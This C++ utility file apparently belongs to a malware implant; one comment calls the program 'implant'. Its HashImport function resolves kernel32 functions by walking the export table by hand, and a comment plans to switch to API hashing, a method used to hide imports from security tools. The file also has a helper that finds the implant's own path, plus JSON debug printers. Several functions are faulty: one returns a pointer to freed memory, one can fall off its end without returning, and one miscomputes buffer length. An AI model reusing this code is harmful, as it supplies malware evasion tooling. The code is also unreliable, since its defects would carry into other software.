#include "utils.h"
#include "rapidjson/document.h"
#include "debug.h"

std::wstring string_to_wstring(const std::string text)
{
    return std::wstring(text.begin(), text.end());
}

LPCWSTR string_to_lpcwstr(const std::string text)
{
    return string_to_wstring(text).c_str();
}

std::string LPBYTEToString(LPBYTE bytes, size_t length)
{
    return std::string(reinterpret_cast<char *>(bytes), reinterpret_cast<char *>(bytes + length));
}

size_t GetLPBYTELength(LPBYTE bytes)
{
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(bytes, &mbi, sizeof(mbi));
    return mbi.RegionSize;
}

std::vector<BYTE> LPBYTEToVector(LPBYTE bytes, size_t length)
{
    return std::vector<BYTE>(bytes, bytes + length);
}

FARPROC HashImport(char* name) {
    PIMAGE_DOS_HEADER handle;
    handle = (PIMAGE_DOS_HEADER)LoadLibraryA("kernel32.dll");

    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)(handle) + handle->e_lfanew);

    long export_rva = (nt_headers->OptionalHeader.DataDirectory)[0].VirtualAddress;
    
    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)(handle) + export_rva);
    
    long number_of_funcs = export_dir->NumberOfNames;

    long* names = (long*)((BYTE*)(handle) + export_dir->AddressOfNames);
    long* funcs = (long*)((BYTE*)(handle) + export_dir->AddressOfFunctions);

    for (int i = 0; i < number_of_funcs; i++) {
        char* funname = (char*)((BYTE*)(handle) + names[i]);
        if (strcmp(funname, name) == 0) { // replace this with hashes 
            FARPROC yes = (FARPROC)((BYTE*)(handle) + funcs[i]);
            return yes;
        }
    }
}

/**
 * Gets filepath of self (implant)
*/
wchar_t* GetImplantPath()
{
	wchar_t* path = new wchar_t[MAX_PATH];
	GetModuleFileNameW(NULL, path, MAX_PATH);
	return path;
}

void PrintJsonType(const rapidjson::GenericValue<rapidjson::UTF8<>> *json)
{
	if (json->IsObject())
	{
		DEBUG_PRINTF("JSON is object\n");

		for (rapidjson::Value::ConstMemberIterator itr = json->MemberBegin(); itr != json->MemberEnd(); ++itr)
		{
			DEBUG_PRINTF("Key: %s\n", itr->name.GetString());
			PrintJsonType(&itr->value);
		}

	} else if (json->IsArray())
	{
		DEBUG_PRINTF("JSON is array\n");
		for (rapidjson::SizeType i = 0; i < json->Size(); i++)
		{
			PrintJsonType(&(*json)[i]);
		}
	} else if (json->IsString())
	{
		DEBUG_PRINTF("JSON is string: %s\n", json->GetString());
	} else if (json->IsInt())
	{
		DEBUG_PRINTF("JSON is int: %d\n", json->GetInt());
	} else if (json->IsBool())
	{
		DEBUG_PRINTF("JSON is bool: %d\n", json->GetBool());
	} else if (json->IsNull())
	{
		DEBUG_PRINTF("JSON is null\n");
	} else if (json->IsDouble())
	{
		DEBUG_PRINTF("JSON is double: %f\n", json->GetDouble());
	} else
	{
		DEBUG_PRINTF("JSON is unknown\n");
	}
}
